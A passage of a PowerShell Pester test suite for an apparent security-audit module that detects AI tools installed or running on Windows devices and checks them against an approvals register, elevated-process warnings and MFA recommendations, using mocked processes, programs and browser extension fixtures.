            $global:CETestAI = [pscustomobject]@{ Tools = $Tools; UninspectedProcesses = $Uninspected; ProfileChecked = $ProfileChecked }
            Mock -ModuleName CEAudit Get-CEAIToolState { $global:CETestAI }
        }
    }

    It 'the sandbox install catalogue is an overlay of the shipped tool list (same ids, no duplicated identity)' {
        # config/ai-tools.json is the one place a tool is defined. sandbox/tools.json only says how the lab
        # installs it. Ids must agree both ways so a rule cannot exist without a way to test it, and the
        # overlay must not restate identity that could drift from the rules.
        $rules = @((Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw | ConvertFrom-Json).tools)
        $lab = @((Get-Content (Join-Path $script:RepoRoot 'sandbox\tools.json') -Raw | ConvertFrom-Json).tools)
        $isHelper = { param($t) [bool]($t.PSObject.Properties['helper'] -and $t.helper) }
        $labIds = @($lab | Where-Object { -not (& $isHelper $_) } | ForEach-Object id | Sort-Object)
        $ruleIds = @($rules | ForEach-Object id | Sort-Object)
        @($ruleIds | Where-Object { $labIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'every detection rule needs a lab entry (a recipe, or manual: true with a reason)'
        @($labIds | Where-Object { $ruleIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'the lab cannot install a tool the rules do not know'
        foreach ($t in $lab) {
            if (& $isHelper $t) { continue }
            $t.PSObject.Properties['name'] | Should -BeNullOrEmpty -Because "$($t.id): identity belongs in config/ai-tools.json"
            $manual = [bool]($t.PSObject.Properties['manual'] -and $t.manual)
            if ($manual) { [string]$t.reason | Should -Not -BeNullOrEmpty -Because "$($t.id) is manual and must say why" }
            else { [string]$t.install.type | Should -BeIn @('winget', 'script', 'npm', 'vscode') -Because $t.id }
        }
    }

    It 'the shipped tool list is well formed' {
        $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'ai-tools.json') -Raw | ConvertFrom-Json
        $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
        $list.schemaVersion | Should -Be 2
        $ids = @($list.tools | ForEach-Object { $_.id })
        ($ids | Sort-Object -Unique).Count | Should -Be $ids.Count
        # @($null).Count is 1, so count only properties that are there.
        $items = { param($o, [string]$n) if ($null -eq $o) { return , @() }; $p = $o.PSObject.Properties[$n]; if ($p -and $null -ne $p.Value) { return , @($p.Value) }; return , @() }
        $idPattern = @{ chrome = '^[a-p]{32}$'; edge = '^[a-p]{32}$'; opera = '^[a-p]{32}$'
            firefox = '^(\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}|[A-Za-z0-9._+-]{1,80}@[A-Za-z0-9.-]{1,80})$' }
        $extIds = @()
        foreach ($t in @($list.tools)) {
            # Detection signals live in a block per operating system; nothing Windows-specific at the top level.
            foreach ($legacy in 'programs', 'uninstallKeys', 'appx', 'processes', 'paths', 'vscodeExtensions', 'mcpConfigs', 'enabled') {
                $t.PSObject.Properties[$legacy] | Should -BeNullOrEmpty -Because "$($t.id): $legacy belongs in the windows block"
            }
            # Browser extension ids are the same on every operating system, so they are shared, at the top level.
            $exts = & $items $t 'browserExtensions'
            $wProp = $t.PSObject.Properties['windows']
            $w = if ($wProp) { $wProp.Value } else { $null }
            ($null -ne $w -or $exts.Count -gt 0) | Should -BeTrue -Because "$($t.id) needs a windows block or browserExtensions"
            $signals = $exts.Count
            foreach ($n in 'programs', 'uninstallKeys', 'appx', 'processes', 'paths', 'vscodeExtensions') { $signals += (& $items $w $n).Count }
            $signals | Should -BeGreaterThan 0 -Because $t.id
            foreach ($e in $exts) {
                [string]$e.store | Should -BeIn @('chrome', 'edge', 'opera', 'firefox') -Because $t.id
                [string]$e.id | Should -Match $idPattern[[string]$e.store] -Because "$($t.id): $($e.store) id"
                ([string]$e.id).Length | Should -BeLessOrEqual 128 -Because $t.id
                $extIds += $(if ($e.store -eq 'firefox') { [string]$e.id } else { ([string]$e.id).ToLowerInvariant() })
            }
            foreach ($proc in (& $items $w 'processes')) { $proc.image | Should -Match '^[\w. -]+\.exe$' -Because $t.id }
            foreach ($prog in (& $items $w 'programs')) { ($prog.name -replace '[*?]', '').Length | Should -BeGreaterOrEqual 4 -Because "$($t.id) program pattern must not be too broad" }
            @($t.sources).Count | Should -BeGreaterThan 0 -Because $t.id
            foreach ($u in @($t.sources)) { $u | Should -Match '^https://' -Because $t.id }
        }
        @($extIds | Group-Object | Where-Object Count -gt 1 | ForEach-Object Name) -join ', ' | Should -BeNullOrEmpty -Because 'an extension id belongs to one tool'
    }

    It 'detects tools from programs, Store apps, profile folders, extensions and processes' {
        $profileDir = Join-Path $TestDrive 'ai-profile'
        New-Item -ItemType Directory -Force -Path (Join-Path $profileDir '.gemini'), (Join-Path $profileDir '.vscode\extensions\github.copilot-chat-0.30.0'), (Join-Path $profileDir '.vscode\extensions\github.copilot-1.350.0'),
            (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot') | Out-Null
        # VS Code 1.13x: the app sits in a commit-hash folder (any name; it changes every release and the
        # module enumerates whatever is there) and ships Copilot Chat as a built-in whose folder is just
        # "copilot"; its package.json carries the real identity.
        Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub", "version": "0.66.0" }' -Encoding ASCII
        $builtInDir = Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions'
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @($builtInDir) }.GetNewClosure()
        InModuleScope CEAudit -Parameters @{ P = $profileDir } {
            param($P)
            $script:aiProfile = $P
            # The shipped catalog plus a browser that can't act on the device, which runs many processes.
            $orig = (Get-CEConfig).'ai-tools'
            (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @(@($orig.tools) + @(
                [pscustomobject]@{ id = 't-browser'; name = 'Browser Y'; canActOnDevice = $false; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'browsx.exe'; path = '*\Browser Y\*' }) } })) }
            try {
                Mock Get-CEUserProfilePath { $script:aiProfile }
                Mock Get-CEInstalledSoftware {
                    @([pscustomobject]@{ Name = 'Cursor (User)'; Version = '1.6'; Publisher = 'Anysphere'; KeyName = '{DADADADA}_is1' },
                      [pscustomobject]@{ Name = 'Cursor Themes Pack'; Version = '2'; Publisher = 'Somebody else'; KeyName = 'x' },
                      [pscustomobject]@{ Name = 'Ollama version 0.34.1'; Version = '0.34.1'; Publisher = 'Ollama'; KeyName = '{44E8}_is1' })
                }
                Mock Get-CEStorePackageName { @('Claude', 'Microsoft.Copilot', 'Microsoft.WindowsCalculator') }
                Mock Get-CEProcessList {
                    @([pscustomobject]@{ Name = 'claude.exe'; ProcessId = 10; Path = 'C:\Program Files\WindowsApps\Claude_2.1_x64__pzs8sxrjxfjjc\app\claude.exe'; CommandLine = 'claude.exe'; Cim = $null },
                      [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 20; Path = 'C:\Users\paul\.local\bin\claude.exe'; CommandLine = 'claude'; Cim = $null },
                      [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 30; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'node.exe'; ProcessId = 40; Path = 'C:\nodejs\node.exe'; CommandLine = 'node C:\npm\node_modules\@google\gemini-cli\bundle\gemini.js'; Cim = $null },
                      [pscustomobject]@{ Name = 'node.exe'; ProcessId = 50; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'copilot.exe'; ProcessId = 60; Path = 'C:\Tools\SomethingElse\copilot.exe'; CommandLine = 'copilot'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 70; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 71; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx --type=renderer'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 72; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx --type=gpu'; Cim = $null })
                }
                Mock Get-CEProcessOwner { 'PC\paul' }
                Mock Get-CEProcessElevation { if ($ProcessId -eq 20) { 1 } else { 0 } }
                $st = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false })
                $byId = @{}
                foreach ($t in $st.Tools) { $byId[$t.Id] = $t }
                @($byId.Keys | Sort-Object) | Should -Be @('claude-code', 'claude-desktop', 'cursor', 'gemini-cli', 'github-copilot-vscode', 'ollama', 't-browser')
                $byId['claude-desktop'].Processes.ProcessId | Should -Be 10
                $byId['claude-desktop'].Signals | Should -Contain 'Running: claude.exe (pid 10)'
                $byId['t-browser'].Signals | Should -Be @('Running: browsx.exe (3 processes)') -Because 'a tool that cannot act on the device has its processes counted, not listed'
                $byId['claude-code'].Processes.ProcessId | Should -Be 20 -Because 'claude.exe is told apart by path'
                $byId['claude-code'].Processes[0].Elevated | Should -BeTrue
                $byId['cursor'].Signals | Should -Contain 'Installed program: Cursor (User) 1.6'
                $byId['ollama'].Signals | Should -Contain 'Installed program: Ollama version 0.34.1'
                @($byId['ollama'].Processes).Count | Should -Be 0
                $byId['github-copilot-vscode'].Signals | Should -Be @('VS Code extension: github.copilot-chat-0.30.0', 'VS Code built-in extension: github.copilot-chat', 'VS Code extension: github.copilot-1.350.0')
                $byId['gemini-cli'].Signals | Should -Contain 'Found %USERPROFILE%\.gemini'
                $st.UninspectedProcesses | Should -Be @('claude.exe (pid 30)') -Because 'node.exe and unrelated copilot.exe are not reported'
                Should -Invoke Get-CEProcessOwner -Times 0 -ParameterFilter { $Process.ProcessId -eq 60 }
            }
            finally { (Get-CEConfig).'ai-tools' = $orig }
        }
    }

    It 'reports unreadable processes only for tools that can act on the device' {
        # A browser or chat app whose process can't be read is not a possible hidden agent (UA-10).
        InModuleScope CEAudit {
            $orig = (Get-CEConfig).'ai-tools'
            try {
                (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @(
                    [pscustomobject]@{ id = 't-agent'; name = 'Agent X'; canActOnDevice = $true; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'agentx.exe'; path = '*\x\*' }) } },
                    [pscustomobject]@{ id = 't-browser'; name = 'Browser Y'; canActOnDevice = $false; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'browsx.exe'; path = '*\y\*' }) } }) }
                Mock Get-CEUserProfilePath { $null }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                Mock Get-CEProcessList {
                    @([pscustomobject]@{ Name = 'agentx.exe'; ProcessId = 1; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 2; Path = ''; CommandLine = ''; Cim = $null })
                }
                $st = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false })
                @($st.UninspectedProcesses) | Should -Be @('agentx.exe (pid 1)')
            }
            finally { (Get-CEConfig).'ai-tools' = $orig }
        }
    }

    It 'SC-09 warns about agents that can act on the device, not local or chat-only tools' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'SC-09')
        $warn = @($f | Where-Object { $_.Subject -eq 'Claude desktop app' })
        $warn.Status | Should -Be 'Warn'
        $warn.Actual | Should -Be 'AI agent that can act on this device: Claude desktop app'
        $warn.Recommendation | Should -Match 'MFA'
        @($f | Where-Object { $_.Subject -eq 'Ollama' }).Count | Should -Be 0
    }

    It 'UA-07 asks for MFA on the accounts AI tools use' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Cursor' -Service 'Cursor'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'UA-07')
        ($f | Where-Object Subject -eq 'Anthropic (Claude)').Actual | Should -Match 'detected via: Claude desktop app'
        ($f | Where-Object Subject -eq 'Cursor').Status | Should -Be 'Manual'
        @($f | Where-Object Subject -eq '').Count | Should -Be 0
    }

    It 'UA-10: not applicable, pass, warn when elevated or SYSTEM, manual when it cannot tell' {
        Set-TestAITools -Tools @(New-TestAITool 'Ollama' -Service '' -CanAct $false)
        (@(Invoke-CEAuditCore -Id 'UA-10'))[0].Status | Should -Be 'NotApplicable'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'none running at the time of the audit'

        Set-TestAITools -Tools @((New-TestAITool 'Claude Code' -Processes @((New-TestAgentProcess 20 -Elevated $true), (New-TestAgentProcess 21))),
                                 (New-TestAITool 'Cursor' -Service 'Cursor' -Processes @(New-TestAgentProcess 22 'Cursor.exe' $null 'NT AUTHORITY\SYSTEM')))
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Warn'
        $f[0].Actual | Should -Be 'Running with administrator rights: Claude Code: claude.exe pid 20 as PC\paul; Cursor: Cursor.exe pid 22 as NT AUTHORITY\SYSTEM'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code' -Processes @(New-TestAgentProcess 20 -Elevated $null)) -Uninspected @('claude.exe (pid 30)')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Be "Couldn't check: Claude Code: claude.exe pid 20 as PC\paul; Possible AI agent claude.exe (pid 30) (path not readable)"
    }

    Context 'approved AI tools register (SC-14)' {
        BeforeAll {
            $global:CEOrigApprovals = InModuleScope CEAudit { (Get-CEConfig).'ai-approvals' }
            function global:Set-TestApprovals {
                # The register as JSON text, parsed the way the module parses config files.
                param([string]$Json)
                InModuleScope CEAudit -Parameters @{ J = $Json } { param($J) (Get-CEConfig).'ai-approvals' = ($J | ConvertFrom-Json) }
            }
            function global:Get-TestDay { param([int]$DaysAgo) (Get-Date).Date.AddDays(-$DaysAgo).ToString('yyyy-MM-dd') }
            $global:CETestTools = @((New-TestAITool 'Claude Code' -Id 'claude-code'), (New-TestAITool 'Cursor' -Service 'Cursor' -Id 'cursor'),
                (New-TestAITool 'Google Gemini CLI' -Service 'Google (Gemini)' -Id 'gemini-cli'), (New-TestAITool 'Ollama' -Service '' -CanAct $false -Id 'ollama'))
        }
        AfterEach {
            InModuleScope CEAudit -Parameters @{ O = $global:CEOrigApprovals } { param($O) (Get-CEConfig).'ai-approvals' = $O }
        }

        It 'ships an empty register' {
            $r = Get-Content (Join-Path $script:RepoRoot 'config\ai-approvals.json') -Raw | ConvertFrom-Json
            @($r.tools).Count | Should -Be 0
            $r.maxApprovalAgeDays | Should -Be 365
        }

        It 'is not applicable when no AI tools are found' {
            Set-TestAITools -Tools @()
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'NotApplicable'
        }

        It 'passes approved tools, fails ones not approved and warns about ones not reviewed, chat-only tools included' {
            Set-TestAITools -Tools $global:CETestTools
            Set-TestApprovals @"
{ "maxApprovalAgeDays": 365, "tools": [
  { "id": "claude-code", "decision": "approved", "decidedBy": "A. Person", "decidedOn": "$(Get-TestDay 10)", "reason": "Team plan" },
  { "id": "cursor", "decision": "not-approved", "decidedBy": "A. Person", "decidedOn": "$(Get-TestDay 10)", "reason": "Use Copilot" }
] }
"@
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $by = @{}; foreach ($x in $f) { $by[$x.Subject] = $x }
            $by['Claude Code'].Status | Should -Be 'Pass'
            $by['Claude Code'].Actual | Should -Be "Approved by A. Person on $(Get-TestDay 10): Team plan"
            $by['Cursor'].Status | Should -Be 'Fail'
            $by['Cursor'].Actual | Should -Be "Not approved (by A. Person on $(Get-TestDay 10)): Use Copilot"
            $by['Google Gemini CLI'].Status | Should -Be 'Warn'
            $by['Google Gemini CLI'].Actual | Should -Match '^Not reviewed'
            $by['Google Gemini CLI'].Recommendation | Should -Match 'Google \(Gemini\) account uses MFA'
            $by['Ollama'].Status | Should -Be 'Warn' -Because 'chat-only and local tools need a decision too'
            (Get-CECheck -Id 'SC-14').Frameworks | Should -Be @('NCSC') -Because 'shadow AI must not fail the Cyber Essentials judgement'
        }

        It 'treats old or incomplete approvals as due for review' {
            Set-TestAITools -Tools @($global:CETestTools[0], $global:CETestTools[1], $global:CETestTools[2])
            Set-TestApprovals @"
{ "maxApprovalAgeDays": 365, "tools": [
  { "id": "claude-code", "decision": "approved", "decidedBy": "A. Person", "decidedOn": "$(Get-TestDay 400)" },
  { "id": "cursor", "decision": "Approved", "decidedOn": "$(Get-TestDay 5)" },
  { "id": "gemini-cli", "decision": "approved", "decidedBy": "A. Person", "decidedOn": "$(Get-TestDay -30)" }
] }
"@
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $by = @{}; foreach ($x in $f) { $by[$x.Subject] = $x }
            $by['Claude Code'].Status | Should -Be 'Warn'
            $by['Claude Code'].Actual | Should -Match '400 days ago; approvals are reviewed every 365 days'
            $by['Cursor'].Status | Should -Be 'Warn' -Because 'an approval must say who approved it (the decision itself is case-insensitive)'
            $by['Cursor'].Actual | Should -Match 'missing who approved it'
            $by['Google Gemini CLI'].Status | Should -Be 'Warn' -Because 'a date in the future is not a valid decision date'
        }

        It 'flags entries it cannot use, and counts those tools as not reviewed' {
            Set-TestAITools -Tools @($global:CETestTools[1], $global:CETestTools[2])
            Set-TestApprovals @"
{ "maxApprovalAgeDays": "soon", "tools": [
  { "id": "not-a-tool", "decision": "approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 1)" },
  { "id": "cursor", "decision": "approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 1)" },
  { "id": "cursor", "decision": "not-approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 1)" },
  { "id": "gemini-cli", "decision": "yes", "decidedBy": "A", "decidedOn": "$(Get-TestDay 1)" },
  { "decision": "approved" }
] }
"@
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $reg = @($f | Where-Object Subject -eq 'ai-approvals.json')
            $reg.Status | Should -Be 'Warn'
            $reg.Actual | Should -Match "maxApprovalAgeDays 'soon'"
            $reg.Actual | Should -Match "'not-a-tool' is not a tool in ai-tools.json"
            $reg.Actual | Should -Match "'cursor' is listed 2 times"
            $reg.Actual | Should -Match "'gemini-cli' has decision 'yes'"
            $reg.Actual | Should -Match 'an entry has no id'
            @($f | Where-Object Subject -eq 'Cursor').Actual | Should -Match '^Not reviewed' -Because 'conflicting entries are ignored until fixed'
            @($f | Where-Object Subject -eq 'Google Gemini CLI').Actual | Should -Match '^Not reviewed'
        }

        It 'reads a register with a single entry' {
            # Windows PowerShell 5.1 hands back a lone object rather than a one-item array in several places.
            Set-TestAITools -Tools @($global:CETestTools[0])
            Set-TestApprovals "{ `"tools`": [ { `"id`": `"claude-code`", `"decision`": `"approved`", `"decidedBy`": `"A. Person`", `"decidedOn`": `"$(Get-TestDay 3)`" } ] }"
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Pass'
        }

        It 'SC-09 leaves out an approved agent but still raises one not reviewed' {
            Set-TestAITools -Tools @($global:CETestTools[0], $global:CETestTools[1])
            Set-TestApprovals "{ `"tools`": [ { `"id`": `"claude-code`", `"decision`": `"approved`", `"decidedBy`": `"A. Person`", `"decidedOn`": `"$(Get-TestDay 3)`" } ] }"
            $f = @(Invoke-CEAuditCore -Id 'SC-09')
            @($f | Where-Object Subject -eq 'Claude Code').Count | Should -Be 0
            $cursor = @($f | Where-Object Subject -eq 'Cursor')
            $cursor.Status | Should -Be 'Warn'
            $cursor.Recommendation | Should -Match 'ai-approvals.json \(SC-14\)'
        }

        It 'puts each tool''s approval and the counts in the AI posture, apart from containment' {
            Set-TestAITools -Tools $global:CETestTools
            Set-TestApprovals @"
{ "tools": [
  { "id": "claude-code", "decision": "approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 3)" },
  { "id": "cursor", "decision": "not-approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 3)" },
  { "id": "ollama", "decision": "approved", "decidedBy": "A", "decidedOn": "$(Get-TestDay 900)" }
] }
"@
            $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
            $by = @{}; foreach ($a in @($ai.agents)) { $by[$a.id] = $a }
            $by['claude-code'].approval | Should -Be 'approved'
            $by['cursor'].approval | Should -Be 'not-approved'
            $by['gemini-cli'].approval | Should -Be 'unreviewed'
            $by['ollama'].approval | Should -Be 'stale'
            $by['cursor'].approvalDetail | Should -Match '^Not approved'
            @($ai.approved, $ai.unapproved, $ai.unreviewed, $ai.approvalStale) | Should -Be @(1, 1, 1, 1)
            $ai.contained | Should -BeTrue -Because 'approval is a decision, not containment'
            InModuleScope CEAudit -Parameters @{ A = $ai } { param($A) Get-CEAIApprovalSummary -Posture $A } |
                Should -Be '1 approved, 1 not approved, 1 due for review, 1 not reviewed'
        }

        It 'shows approvals in the report, and says what it cannot see' {
            Set-TestAITools -Tools @($global:CETestTools[0], $global:CETestTools[2])
            Set-TestApprovals "{ `"tools`": [ { `"id`": `"claude-code`", `"decision`": `"approved`", `"decidedBy`": `"A. O'Brien`", `"decidedOn`": `"$(Get-TestDay 3)`" } ] }"
            $findings = @(Invoke-CEAuditCore -Id 'SC-14')
            $r = Export-CEReport -Findings $findings -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'ai-report')
            $md = Get-Content $r.Paths.Markdown -Raw
            $html = Get-Content $r.Paths.Html -Raw
            $md | Should -Match ([regex]::Escape('- Claude Code - present - approved'))
            $md | Should -Match ([regex]::Escape('- Google Gemini CLI - present - **not reviewed**'))
            $md | Should -Match ([regex]::Escape('Approval (config/ai-approvals.json, SC-14): 1 approved, 1 not reviewed.'))
            $html | Should -Match "<span class='appr ok' title='Approved by A\. O&#39;Brien on "
            $html | Should -Match "<span class='appr due'[^>]*>not reviewed</span>"
            $html | Should -Match ([regex]::Escape("Baseline finds recognised AI apps and browser extensions installed on this device. It can't see AI websites used in a browser tab."))
            $md | Should -Match ([regex]::Escape("Baseline finds recognised AI apps and browser extensions installed on this device. It can't see AI websites used in a browser tab."))
        }

        It 'reads Windows signals from the windows block, and from the top level in older overrides' {
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'ai-tools'
                try {
                    (Get-CEConfig).'ai-tools' = [pscustomobject]@{ tools = @(
                        [pscustomobject]@{ id = 'grouped'; windows = [pscustomobject]@{ paths = @('.grouped') } },
                        [pscustomobject]@{ id = 'off-here'; windows = [pscustomobject]@{ enabled = $false; paths = @('.off') } },
                        [pscustomobject]@{ id = 'mac-only'; macos = [pscustomobject]@{ paths = @('.mac') } },
                        [pscustomobject]@{ id = 'flat'; paths = @('.flat'); mcpConfigs = @([pscustomobject]@{ path = '.flat.json' }) },
                        [pscustomobject]@{ id = 'ext-only'; browserExtensions = @([pscustomobject]@{ store = 'chrome'; id = 'fcoeoabgfenejglbffodgkkbkcdhcgfn' }) },
                        [pscustomobject]@{ id = 'ext-off'; windows = [pscustomobject]@{ enabled = $false }; browserExtensions = @([pscustomobject]@{ store = 'chrome'; id = 'hehggadaopoacecdllhhajmbjkdcmajg' }) },
                        [pscustomobject]@{ id = 'both'; windows = [pscustomobject]@{ paths = @('.both') }; browserExtensions = @([pscustomobject]@{ store = 'firefox'; id = 'support@wordtune.com' }) }) }
                    $catalog = Get-CEAIToolCatalog
                    @($catalog | ForEach-Object { $_.Tool.id }) | Should -Be @('grouped', 'flat', 'ext-only', 'both') -Because 'enabled: false turns off extensions too'
                    @($catalog[0].Signals.paths) | Should -Be @('.grouped')
                    @($catalog[1].Signals.paths) | Should -Be @('.flat') -Because 'an override written before signals were grouped still works'
                    @($catalog[2].Signals.PSObject.Properties).Count | Should -Be 0 -Because 'a tool found only by its browser extensions has no Windows signals'
                    $ids = Get-CEBrowserExtensionIdSet -Catalog $catalog
                    @($ids.Chromium.Keys) | Should -Be @('fcoeoabgfenejglbffodgkkbkcdhcgfn')
                    @($ids.Firefox.Keys) | Should -Be @('support@wordtune.com')
                    $mcp = Get-CEMcpConfigCatalogue
                    @($mcp | ForEach-Object { $_.ToolId }) | Should -Be @('flat')

                    # A v2 override with no browserExtensions anywhere still reads.
                    (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @([pscustomobject]@{ id = 'grouped'; name = 'Grouped'; windows = [pscustomobject]@{ paths = @('.grouped') } }) }
                    Mock Get-CEUserProfilePath { $null }
                    Mock Get-CEInstalledSoftware { @() }
                    Mock Get-CEStorePackageName { , @() }
                    Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                    Mock Get-CEProcessList { , @() }
                    { Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false }) } | Should -Not -Throw
                }
                finally { (Get-CEConfig).'ai-tools' = $orig }
            }
        }
    }

    Context 'AI browser extensions' {
        BeforeAll {
            $global:CEOrigBrowserConfig = InModuleScope CEAudit { @{ Tools = (Get-CEConfig)['ai-tools']; Browsers = (Get-CEConfig)['browser-profiles']; Approvals = (Get-CEConfig)['ai-approvals'] } }
            $global:CETestExtId = @{ Claude = 'fcoeoabgfenejglbffodgkkbkcdhcgfn'; ChatGpt = 'hehggadaopoacecdllhhajmbjkdcmajg'; ChatGptEdge = 'odlomjlbamekndcpllcnffbgeohgkmjh'
                Other = 'cjpalhdlnbpafiamejdnhcphjbkeiagm'; Early = ('a' * 32) }
            # Tools found only by their browser extensions, with real store ids.
            $global:CETestExtTools = @"
{ "schemaVersion": 2, "tools": [
  { "id": "t-claude", "name": "Claude test", "service": "Anthropic (Claude)", "canActOnDevice": false,
    "browserExtensions": [ { "store": "chrome", "id": "$($CETestExtId.Claude)" } ] },
  { "id": "t-chatgpt", "name": "ChatGPT test", "service": "OpenAI (ChatGPT)", "canActOnDevice": false,
    "browserExtensions": [ { "store": "edge", "id": "$($CETestExtId.ChatGptEdge)" }, { "store": "chrome", "id": "$($CETestExtId.ChatGpt)" } ] },
  { "id": "t-wordtune", "name": "Wordtune test", "service": "Wordtune", "canActOnDevice": false,
    "browserExtensions": [ { "store": "firefox", "id": "support@wordtune.com" }, { "store": "firefox", "id": "x@y.xpix" } ] }
] }
"@
            # The browsers the fixtures use, with no 'installed' files, so nothing is labelled a leftover.
            $global:CETestBrowsers = @'
{ "maxProfilesPerBrowser": 64, "maxEntriesPerFolder": 2000, "windows": [
  { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data" },
  { "name": "Microsoft Edge", "engine": "chromium", "root": "AppData\\Local\\Microsoft\\Edge\\User Data" },
  { "name": "Brave", "engine": "chromium", "root": "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data" },
  { "name": "Opera", "engine": "chromium", "root": "AppData\\Roaming\\Opera Software\\Opera Stable", "rootIsProfile": true },
  { "name": "Mozilla Firefox", "engine": "firefox", "root": "AppData\\Roaming\\Mozilla\\Firefox\\Profiles" }
] }
'@
            $global:CETestChromeData = 'AppData\Local\Google\Chrome\User Data'
            function global:Set-TestBrowserConfig {
                # Replaces ai-tools.json and/or browser-profiles.json (JSON text, parsed the way the module parses config files).
                param([string]$Tools, [string]$Browsers)
                InModuleScope CEAudit -Parameters @{ T = $Tools; B = $Browsers } {
                    param($T, $B)
                    if ($T) { (Get-CEConfig)['ai-tools'] = ($T | ConvertFrom-Json) }
                    if ($B) { (Get-CEConfig)['browser-profiles'] = ($B | ConvertFrom-Json) }
                }
            }
            function global:New-TestTree {
                # Folders under Root; paths ending in a file name (.xpi, .xpix, .exe, Preferences) become empty files.
                param([string]$Root, [string[]]$Paths)
                foreach ($rel in $Paths) {
                    $full = Join-Path $Root $rel
                    if ($rel -match '(\.xpix?|\.exe|\\Preferences)$') {
                        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $full) | Out-Null
                        Set-Content -LiteralPath $full -Value '' -Encoding ASCII
                    }
                    else { New-Item -ItemType Directory -Force -Path $full | Out-Null }
                }
            }
            function global:Invoke-TestBrowserScan {
                # Get-CEAIToolStateUncached over a fixture profile; nothing else on this machine is looked at
                # (the Program Files variables point at an empty folder, see BeforeEach).
                # -System runs it as SYSTEM, -Elevated as an elevated user; neither is the user's own session.
                param([string]$ProfilePath, [switch]$System, [switch]$Elevated, [object[]]$Processes, [object[]]$Software, [string[]]$Store)
                $procs = if ($Processes) { @($Processes) } else { @() }
                $sw = if ($Software) { @($Software) } else { @() }
                $st = if ($Store) { @($Store) } else { @() }
                InModuleScope CEAudit -Parameters @{ P = $ProfilePath; S = [bool]$System; E = [bool]($System -or $Elevated); Pr = $procs; Sw = $sw; St = $st } {
                    param($P, $S, $E, $Pr, $Sw, $St)
                    $script:testBrowserProfile = $P
                    $script:testBrowserProcs = @($Pr | Where-Object { $null -ne $_ })
                    $script:testBrowserSoftware = @($Sw | Where-Object { $null -ne $_ })
                    $script:testBrowserStore = @($St | Where-Object { $_ })
                    Mock Get-CEUserProfilePath { $script:testBrowserProfile }
                    Mock Get-CEInstalledSoftware { $script:testBrowserSoftware }
                    Mock Get-CEStorePackageName { , $script:testBrowserStore }
                    Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
